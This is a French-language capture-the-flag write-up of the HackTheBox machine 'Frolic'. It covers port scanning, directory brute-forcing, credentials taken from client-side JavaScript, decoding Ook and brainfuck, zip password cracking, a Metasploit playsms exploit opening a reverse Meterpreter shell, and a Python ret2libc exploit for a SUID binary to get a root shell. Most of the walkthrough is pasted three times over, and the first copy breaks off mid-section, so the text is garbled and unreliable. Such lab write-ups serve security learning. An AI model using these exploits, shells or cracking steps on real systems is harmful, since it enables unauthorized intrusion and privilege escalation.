# Frolic writeups by Seyptoo.

[![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/12/6/1553333910-capture-du-2019-03-23-10-37-40.png)

Informations
----
    Ip : 10.10.10.111        Created by : felamos
    Level : Medium           Base Points : 20

Scan nmap
----
    PORT     STATE SERVICE     VERSION
    22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
    |_  256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
    139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: FROLIC)
    445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: FROLIC)
    9999/tcp open  http        nginx 1.10.3 (Ubuntu)
    |_http-server-header: nginx/1.10.3 (Ubuntu)
    |_http-title: Welcome to nginx!
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    |_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: frolic
    |   NetBIOS computer name: FROLIC
    |   Domain name: 
    |   FQDN: frolic
    |_  System time: 2019-03-23T14:57:44+05:30
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    |_smbv2-enabled: Server supports SMBv2 protocol

Alors il y'a 4 ports open, le 22 pour le SSH, le 139 et 445 pour le Samba, et le port 9999 pour le HTTP qui tourne sous nginx. Une enumération par défault.

HTTP 9999
----
N'oubliez pas d'attribuer le domaine sur le fichier /etc/hosts. Pour justement avoir accéder à la box et au serveur HTTP sans problème.
[![forthebadge made-with-python](https://media.discordapp.net/attachments/556442801085218827/558951107431235596/unknown.png)

    root@Computer:~/htb/box/Frolic/gobuster# /usr/bin/gobuster -w /usr/share/wordlist/directory-list-2.3-medium.txt -u http://forlic.htb:9999/ -x php,html -o output_file

    Gobuster v1.4.1              OJ Reeves (@TheColonial)
    =====================================================
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://forlic.htb:9999/
    [+] Threads      : 10
    [+] Wordlist     : /usr/share/wordlist/directory-list-2.3-medium.txt
    [+] Output file  : output_file
    [+] Status codes : 204,301,302,307,200
    [+] Extensions   : .php,.html
    =====================================================
    /admin (Status: 301)
    /test (Status: 301)
    /dev (Status: 301)
    /backup (Status: 301)
    /playsms (Status: 301)

Comme vous pouvez le voir il y'a un dossier /admin, /test, /backup, /dev et enfin /playsms nous allons un peu regarder le dossier /admin de plus près.

[![forthebadge made-with-python](https://cdn.discordapp.com/attachments/556442801085218827/558962528311443466/unknown.png)
Comme vous pouvez le voir, il y'a un fichier javascript /login.js donc dans ce fichier il y'a sans doute le nom d'utilisateur et le mot de passe.


    root@Computer:~/htb/box/Frolic/gobuster# curl http://10.10.10.111:9999/admin/js/login.js -s
    [...SNIP...]
    if ( username == "admin" && password == "superduperlooperpassword_lol"){
    alert ("Login successfully");
    [...SNIP...]
    
Donc nous avons l'utilisateur et le mot de passe pour se connecter sur la page d'administration et de voir concrètement les informations utiles sur cette page.

    root@Computer:~/htb/box/Frolic# curl http://forlic.htb:9999/admin/success.html
    ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... .....
    ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... .....
    ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! .....
    ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!
    !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... .....
    ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?.
    ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... .....
    ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... .....
    ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!!
    !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!!
    !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?!
    .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?..
    !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?.
    ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.?
    !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!!
    !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!!
    !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. .....
    ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!!
    !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!!
    !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .....
    ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! .....
    ..!.! !!!!! !.?.

Ça ressemble beaucoup à Ook, donc nous allons déchiffrer cela sur un site directement et de voir le résultat final. un lien pour déchiffrer le message. https://www.dcode.fr/langage-ook.

Le message déchiffrer est : Nothing here check /asdiSIAJJ0QWE9JAS. Ça ressemble beaucoup à un chemin HTTP donc nous allons voir ça. Donc dans ce dossier il y'a rien de spécial, il y'a du base64 donc je vais essayer de trouver des fichiers assez spécifiques.

    root@Computer:~/htb/box/Frolic/gobuster# gobuster -w /usr/share/wordlist/directory-list-2.3-medium.txt -u http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ -x zip,html,php

    Gobuster v1.4.1              OJ Reeves (@TheColonial)
    =====================================================
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/
    [+] Threads      : 10
    [+] Wordlist     : /usr/share/wordlist/directory-list-2.3-medium.txt
    [+] Status codes : 301,302,307,200,204
    [+] Extensions   : .zip,.html,.php
    =====================================================
    /crack.zip (Status: 200)
    /index.php (Status: 200)
    
Donc comme vous pouvez le voir il y'a un fichier crack.zip. Donc quand j'essaye de unzip le fichier, le fichier est sécurisé par un mot de passe donc je vais essayer de bruteforce ça pour trouver le mot de passe et de extraire les fichiers.

    root@Computer:~/htb/box/Frolic/gobuster# 7z l crack.zip 

    7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
    p7zip Version 9.20 (locale=fr_FR.UTF-8,Utf16=on,HugeFiles=on,4 CPUs)

    Listing archive: crack.zip

    --
    Path = crack.zip
    Type = zip
    Physical Size = 360

       Date      Time    Attr         Size   Compressed  Name
    ------------------- ----- ------------ ------------  ------------------------
    2018-09-23 13:44:05 .....          617          176  index.php
    ------------------- ----- ------------ ------------  ------------------------
                                       617          176  1 files, 0 folders
                                  
Donc il y'a un fichier php donc nous allons bruteforce le fichier et de voir les informations nécessaires.

    root@Computer:~/htb/box/Frolic/gobuster# fcrackzip --verbose --use-unzip --dictionary --init-password rockyou.txt crack.zip 
    found file 'index.php', (size cp/uc    176/   617, flags 9, chk 89c3)


    PASSWORD FOUND!!!!: pw == password
    
Donc le mot de passe c'est un mot de passe assez vulnérable donc je vais extraire le fichier zip avec la commande unzip. Du coup après avoir extraire le fichier nous avons un fichier php, et quand nous avons le fichier, le fichier est chiffré.

    root@Computer:~/htb/box/Frolic/gobuster# cat index.php|xxd -r -p|base64 -d > brainfuck 2>/dev/null                                                      
    root@Computer:~/htb/box/Frolic/gobuster# cat brainfuck 
    +++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
    ++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
    <]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
    ++..<
    
Donc concrètement pour déchiffrer cela c'est du brainfuck, c'est un langage de programmation donc pour déchiffrer il faut aller sur le site https://www.dcode.fr/langage-ook.
Brainfuck déchiffrer : idkwhatispass

Donc après avoir chercher pendant quelques temps, j'ai réussis à me connecter en tant que admin sur /playsms donc pour la connexion.

Username : admin</br>
Password : idkwhatispass<br/>

Donc nous pouvons maintenant attaquer pour avoir notre shell grâce à metasploit, car il y'a un exploit spécifique pour playsms, je vous ferais un petit tutorial pour vous montrez comment faire ça manuellement. L'exploit se nomme : exploit/multi/http/playsms_uploadcsv_exec

Shell > User.txt
----
    [*] Started reverse TCP handler on 10.10.14.98:4444 
    [+] Authentication successful: admin:idkwhatispass
    [*] Sending stage (38247 bytes) to 10.10.10.111
    [*] Meterpreter session 1 opened (10.10.14.98:4444 -> 10.10.10.111:45836) at 2019-03-23 14:00:25 +0100

    meterpreter > shell
    Process 2062 created.
    Channel 0 created.
    python -c "import pty;pty.spawn('/bin/bash')"
    www-data@frolic:~/html/playsms$ cd /home/ayush
    www-data@frolic:/home/ayush$ wc -c user.txt
    33 user.txt
   
Voilà nous avons accès en tant que www-data nous avons un shell.
    
PrivEsc
----
Donc nous allons chercher les fichiers SUID sur la machine et d'énumérer.
# Frolic writeups by Seyptoo.

[![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/12/6/1553333910-capture-du-2019-03-23-10-37-40.png)

Informations
----
    Ip : 10.10.10.111        Created by : felamos
    Level : Medium           Base Points : 20

Scan nmap
----
    PORT     STATE SERVICE     VERSION
    22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
    |_  256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
    139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: FROLIC)
    445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: FROLIC)
    9999/tcp open  http        nginx 1.10.3 (Ubuntu)
    |_http-server-header: nginx/1.10.3 (Ubuntu)
    |_http-title: Welcome to nginx!
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    |_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: frolic
    |   NetBIOS computer name: FROLIC
    |   Domain name: 
    |   FQDN: frolic
    |_  System time: 2019-03-23T14:57:44+05:30
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    |_smbv2-enabled: Server supports SMBv2 protocol

Alors il y'a 4 ports open, le 22 pour le SSH, le 139 et 445 pour le Samba, et le port 9999 pour le HTTP qui tourne sous nginx. Une enumération par défault.

HTTP 9999
----
N'oubliez pas d'attribuer le domaine sur le fichier /etc/hosts. Pour justement avoir accéder à la box et au serveur HTTP sans problème.
[![forthebadge made-with-python](https://media.discordapp.net/attachments/556442801085218827/558951107431235596/unknown.png)

    root@Computer:~/htb/box/Frolic/gobuster# /usr/bin/gobuster -w /usr/share/wordlist/directory-list-2.3-medium.txt -u http://forlic.htb:9999/ -x php,html -o output_file

    Gobuster v1.4.1              OJ Reeves (@TheColonial)
    =====================================================
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://forlic.htb:9999/
    [+] Threads      : 10
    [+] Wordlist     : /usr/share/wordlist/directory-list-2.3-medium.txt
    [+] Output file  : output_file
    [+] Status codes : 204,301,302,307,200
    [+] Extensions   : .php,.html
    =====================================================
    /admin (Status: 301)
    /test (Status: 301)
    /dev (Status: 301)
    /backup (Status: 301)
    /playsms (Status: 301)

Comme vous pouvez le voir il y'a un dossier /admin, /test, /backup, /dev et enfin /playsms nous allons un peu regarder le dossier /admin de plus près.

[![forthebadge made-with-python](https://cdn.discordapp.com/attachments/556442801085218827/558962528311443466/unknown.png)
Comme vous pouvez le voir, il y'a un fichier javascript /login.js donc dans ce fichier il y'a sans doute le nom d'utilisateur et le mot de passe.


    root@Computer:~/htb/box/Frolic/gobuster# curl http://10.10.10.111:9999/admin/js/login.js -s
    [...SNIP...]
    if ( username == "admin" && password == "superduperlooperpassword_lol"){
    alert ("Login successfully");
    [...SNIP...]
    
Donc nous avons l'utilisateur et le mot de passe pour se connecter sur la page d'administration et de voir concrètement les informations utiles sur cette page.

    root@Computer:~/htb/box/Frolic# curl http://forlic.htb:9999/admin/success.html
    ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... .....
    ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... .....
    ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! .....
    ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!
    !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... .....
    ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?.
    ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... .....
    ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... .....
    ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!!
    !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!!
    !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?!
    .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?..
    !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?.
    ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.?
    !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!!
    !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!!
    !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. .....
    ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!!
    !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!!
    !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .....
    ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! .....
    ..!.! !!!!! !.?.

Ça ressemble beaucoup à Ook, donc nous allons déchiffrer cela sur un site directement et de voir le résultat final. un lien pour déchiffrer le message. https://www.dcode.fr/langage-ook.

Le message déchiffrer est : Nothing here check /asdiSIAJJ0QWE9JAS. Ça ressemble beaucoup à un chemin HTTP donc nous allons voir ça. Donc dans ce dossier il y'a rien de spécial, il y'a du base64 donc je vais essayer de trouver des fichiers assez spécifiques.

    root@Computer:~/htb/box/Frolic/gobuster# gobuster -w /usr/share/wordlist/directory-list-2.3-medium.txt -u http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ -x zip,html,php

    Gobuster v1.4.1              OJ Reeves (@TheColonial)
    =====================================================
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/
    [+] Threads      : 10
    [+] Wordlist     : /usr/share/wordlist/directory-list-2.3-medium.txt
    [+] Status codes : 301,302,307,200,204
    [+] Extensions   : .zip,.html,.php
    =====================================================
    /crack.zip (Status: 200)
    /index.php (Status: 200)
    
Donc comme vous pouvez le voir il y'a un fichier crack.zip. Donc quand j'essaye de unzip le fichier, le fichier est sécurisé par un mot de passe donc je vais essayer de bruteforce ça pour trouver le mot de passe et de extraire les fichiers.

    root@Computer:~/htb/box/Frolic/gobuster# 7z l crack.zip 

    7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
    p7zip Version 9.20 (locale=fr_FR.UTF-8,Utf16=on,HugeFiles=on,4 CPUs)

    Listing archive: crack.zip

    --
    Path = crack.zip
    Type = zip
    Physical Size = 360

       Date      Time    Attr         Size   Compressed  Name
    ------------------- ----- ------------ ------------  ------------------------
    2018-09-23 13:44:05 .....          617          176  index.php
    ------------------- ----- ------------ ------------  ------------------------
                                       617          176  1 files, 0 folders
                                  
Donc il y'a un fichier php donc nous allons bruteforce le fichier et de voir les informations nécessaires.

    root@Computer:~/htb/box/Frolic/gobuster# fcrackzip --verbose --use-unzip --dictionary --init-password rockyou.txt crack.zip 
    found file 'index.php', (size cp/uc    176/   617, flags 9, chk 89c3)


    PASSWORD FOUND!!!!: pw == password
    
Donc le mot de passe c'est un mot de passe assez vulnérable donc je vais extraire le fichier zip avec la commande unzip. Du coup après avoir extraire le fichier nous avons un fichier php, et quand nous avons le fichier, le fichier est chiffré.

    root@Computer:~/htb/box/Frolic/gobuster# cat index.php|xxd -r -p|base64 -d > brainfuck 2>/dev/null                                                      
    root@Computer:~/htb/box/Frolic/gobuster# cat brainfuck 
    +++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
    ++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
    <]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
    ++..<
    
Donc concrètement pour déchiffrer cela c'est du brainfuck, c'est un langage de programmation donc pour déchiffrer il faut aller sur le site https://www.dcode.fr/langage-ook.
Brainfuck déchiffrer : idkwhatispass

Donc après avoir chercher pendant quelques temps, j'ai réussis à me connecter en tant que admin sur /playsms donc pour la connexion.

Username : admin</br>
Password : idkwhatispass<br/>

Donc nous pouvons maintenant attaquer pour avoir notre shell grâce à metasploit, car il y'a un exploit spécifique pour playsms, je vous ferais un petit tutorial pour vous montrez comment faire ça manuellement. L'exploit se nomme : exploit/multi/http/playsms_uploadcsv_exec

Shell > User.txt
----
    [*] Started reverse TCP handler on 10.10.14.98:4444 
    [+] Authentication successful: admin:idkwhatispass
    [*] Sending stage (38247 bytes) to 10.10.10.111
    [*] Meterpreter session 1 opened (10.10.14.98:4444 -> 10.10.10.111:45836) at 2019-03-23 14:00:25 +0100

    meterpreter > shell
    Process 2062 created.
    Channel 0 created.
    python -c "import pty;pty.spawn('/bin/bash')"
    www-data@frolic:~/html/playsms$ cd /home/ayush
    www-data@frolic:/home/ayush$ wc -c user.txt
    33 user.txt
   
Voilà nous avons accès en tant que www-data nous avons un shell.
# Frolic writeups by Seyptoo.

[![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/12/6/1553333910-capture-du-2019-03-23-10-37-40.png)

Informations
----
    Ip : 10.10.10.111        Created by : felamos
    Level : Medium           Base Points : 20

Scan nmap
----
    PORT     STATE SERVICE     VERSION
    22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
    |_  256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
    139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: FROLIC)
    445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: FROLIC)
    9999/tcp open  http        nginx 1.10.3 (Ubuntu)
    |_http-server-header: nginx/1.10.3 (Ubuntu)
    |_http-title: Welcome to nginx!
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    |_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: frolic
    |   NetBIOS computer name: FROLIC
    |   Domain name: 
    |   FQDN: frolic
    |_  System time: 2019-03-23T14:57:44+05:30
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    |_smbv2-enabled: Server supports SMBv2 protocol

Alors il y'a 4 ports open, le 22 pour le SSH, le 139 et 445 pour le Samba, et le port 9999 pour le HTTP qui tourne sous nginx. Une enumération par défault.

HTTP 9999
----
N'oubliez pas d'attribuer le domaine sur le fichier /etc/hosts. Pour justement avoir accéder à la box et au serveur HTTP sans problème.
[![forthebadge made-with-python](https://media.discordapp.net/attachments/556442801085218827/558951107431235596/unknown.png)

    root@Computer:~/htb/box/Frolic/gobuster# /usr/bin/gobuster -w /usr/share/wordlist/directory-list-2.3-medium.txt -u http://forlic.htb:9999/ -x php,html -o output_file

    Gobuster v1.4.1              OJ Reeves (@TheColonial)
    =====================================================
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://forlic.htb:9999/
    [+] Threads      : 10
    [+] Wordlist     : /usr/share/wordlist/directory-list-2.3-medium.txt
    [+] Output file  : output_file
    [+] Status codes : 204,301,302,307,200
    [+] Extensions   : .php,.html
    =====================================================
    /admin (Status: 301)
    /test (Status: 301)
    /dev (Status: 301)
    /backup (Status: 301)
    /playsms (Status: 301)

Comme vous pouvez le voir il y'a un dossier /admin, /test, /backup, /dev et enfin /playsms nous allons un peu regarder le dossier /admin de plus près.

[![forthebadge made-with-python](https://cdn.discordapp.com/attachments/556442801085218827/558962528311443466/unknown.png)
Comme vous pouvez le voir, il y'a un fichier javascript /login.js donc dans ce fichier il y'a sans doute le nom d'utilisateur et le mot de passe.


    root@Computer:~/htb/box/Frolic/gobuster# curl http://10.10.10.111:9999/admin/js/login.js -s
    [...SNIP...]
    if ( username == "admin" && password == "superduperlooperpassword_lol"){
    alert ("Login successfully");
    [...SNIP...]
    
Donc nous avons l'utilisateur et le mot de passe pour se connecter sur la page d'administration et de voir concrètement les informations utiles sur cette page.

    root@Computer:~/htb/box/Frolic# curl http://forlic.htb:9999/admin/success.html
    ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... .....
    ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... .....
    ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! .....
    ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!
    !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... .....
    ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?.
    ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... .....
    ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... .....
    ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!!
    !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!!
    !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?!
    .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?..
    !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?.
    ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.?
    !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!!
    !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!!
    !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. .....
    ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!!
    !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!!
    !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .....
    ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! .....
    ..!.! !!!!! !.?.

Ça ressemble beaucoup à Ook, donc nous allons déchiffrer cela sur un site directement et de voir le résultat final. un lien pour déchiffrer le message. https://www.dcode.fr/langage-ook.

Le message déchiffrer est : Nothing here check /asdiSIAJJ0QWE9JAS. Ça ressemble beaucoup à un chemin HTTP donc nous allons voir ça. Donc dans ce dossier il y'a rien de spécial, il y'a du base64 donc je vais essayer de trouver des fichiers assez spécifiques.

    root@Computer:~/htb/box/Frolic/gobuster# gobuster -w /usr/share/wordlist/directory-list-2.3-medium.txt -u http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ -x zip,html,php

    Gobuster v1.4.1              OJ Reeves (@TheColonial)
    =====================================================
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/
    [+] Threads      : 10
    [+] Wordlist     : /usr/share/wordlist/directory-list-2.3-medium.txt
    [+] Status codes : 301,302,307,200,204
    [+] Extensions   : .zip,.html,.php
    =====================================================
    /crack.zip (Status: 200)
    /index.php (Status: 200)
    
Donc comme vous pouvez le voir il y'a un fichier crack.zip. Donc quand j'essaye de unzip le fichier, le fichier est sécurisé par un mot de passe donc je vais essayer de bruteforce ça pour trouver le mot de passe et de extraire les fichiers.

    root@Computer:~/htb/box/Frolic/gobuster# 7z l crack.zip 

    7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
    p7zip Version 9.20 (locale=fr_FR.UTF-8,Utf16=on,HugeFiles=on,4 CPUs)

    Listing archive: crack.zip

    --
    Path = crack.zip
    Type = zip
    Physical Size = 360

       Date      Time    Attr         Size   Compressed  Name
    ------------------- ----- ------------ ------------  ------------------------
    2018-09-23 13:44:05 .....          617          176  index.php
    ------------------- ----- ------------ ------------  ------------------------
                                       617          176  1 files, 0 folders
                                  
Donc il y'a un fichier php donc nous allons bruteforce le fichier et de voir les informations nécessaires.

    root@Computer:~/htb/box/Frolic/gobuster# fcrackzip --verbose --use-unzip --dictionary --init-password rockyou.txt crack.zip 
    found file 'index.php', (size cp/uc    176/   617, flags 9, chk 89c3)


    PASSWORD FOUND!!!!: pw == password
    
Donc le mot de passe c'est un mot de passe assez vulnérable donc je vais extraire le fichier zip avec la commande unzip. Du coup après avoir extraire le fichier nous avons un fichier php, et quand nous avons le fichier, le fichier est chiffré.

    root@Computer:~/htb/box/Frolic/gobuster# cat index.php|xxd -r -p|base64 -d > brainfuck 2>/dev/null                                                      
    root@Computer:~/htb/box/Frolic/gobuster# cat brainfuck 
    +++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
    ++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
    <]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
    ++..<
    
Donc concrètement pour déchiffrer cela c'est du brainfuck, c'est un langage de programmation donc pour déchiffrer il faut aller sur le site https://www.dcode.fr/langage-ook.
Brainfuck déchiffrer : idkwhatispass

Donc après avoir chercher pendant quelques temps, j'ai réussis à me connecter en tant que admin sur /playsms donc pour la connexion.

Username : admin</br>
Password : idkwhatispass<br/>

Donc nous pouvons maintenant attaquer pour avoir notre shell grâce à metasploit, car il y'a un exploit spécifique pour playsms, je vous ferais un petit tutorial pour vous montrez comment faire ça manuellement. L'exploit se nomme : exploit/multi/http/playsms_uploadcsv_exec

Shell > User.txt
----
    [*] Started reverse TCP handler on 10.10.14.98:4444 
    [+] Authentication successful: admin:idkwhatispass
    [*] Sending stage (38247 bytes) to 10.10.10.111
    [*] Meterpreter session 1 opened (10.10.14.98:4444 -> 10.10.10.111:45836) at 2019-03-23 14:00:25 +0100

    meterpreter > shell
    Process 2062 created.
    Channel 0 created.
    python -c "import pty;pty.spawn('/bin/bash')"
    www-data@frolic:~/html/playsms$ cd /home/ayush
    www-data@frolic:/home/ayush$ wc -c user.txt
    33 user.txt
   
Voilà nous avons accès en tant que www-data nous avons un shell.

    www-data@frolic:/home$ find / -type f -perm -4000 -print 2>/dev/null
    [...SNIP...]
    /home/ayush/.binary/rop
    [...SNIP...]

Voilà nous avons trouver un fichier SUID donc ça ressemble beaucoup à du ROP (Return-oriented programming), donc j'ai créer un script pour exploiter cela directement.

Donc voici le script à transférer et à executer sur la machine cible de la victime.

    from struct import pack
    from subprocess import call

    system = 0xb7e19000 + 0x0003ada0
    exit = 0xb7e19000 + 0x0002e9d0
    binsh = 0xb7e19000 + 0x0015ba0b

    def p32(num):
         return pack("<I",num)

    buf = "A"*52
    buf += p32(system)
    buf += p32(exit)
    buf += p32(binsh)

    call(["/home/ayush/.binary/rop", buf])

